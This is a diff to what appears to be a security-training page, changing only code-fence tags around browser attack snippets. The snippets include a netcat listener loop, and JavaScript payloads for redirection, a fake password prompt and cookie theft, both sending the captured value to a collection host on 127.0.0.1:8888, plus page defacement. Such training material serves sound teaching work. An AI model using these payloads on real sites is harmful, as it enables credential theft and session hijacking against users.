@@ -10,13 +10,13 @@ So this is kinda fun. With this page open, copy and paste one of the listener co
 
 #### Linux
 
-```
+``` text
 while :; do printf "j$ "; read c; printf "HTTP/1.1 200 OK\n\n$c" | nc -lp 8000 >/dev/null; done
 ```
 
 #### OS X
 
-```
+``` text
 while :; do printf "j$ "; read c; printf "HTTP/1.1 200 OK\n\n$c" | nc -l 8000 >/dev/null; done
 ```
 
@@ -24,13 +24,13 @@ while :; do printf "j$ "; read c; printf "HTTP/1.1 200 OK\n\n$c" | nc -l 8000 >/
 
 #### Redirection
 
-```
+``` text
 window.location = 'http://lanmaster53.com/training/'
 ```
 
 #### Phishing
 
-```
+``` text
 i=new Image();i.src="http://127.0.0.1:8888/pw/"+prompt("Password:")
 ```
 
@@ -38,7 +38,7 @@ i=new Image();i.src="http://127.0.0.1:8888/pw/"+prompt("Password:")
 
 #### Session Hijacking
 
-```
+``` text
 i=new Image();i.src="http://127.0.0.1:8888/pw/"+document.cookie
 ```
 
@@ -46,7 +46,7 @@ i=new Image();i.src="http://127.0.0.1:8888/pw/"+document.cookie
 
 #### Defacement
 
-```
+``` text
 d=document;e=d.createElement("p");e.innerHTML="lanmaster53 wuz here!";d.body.appendChild(e)
 ```
 
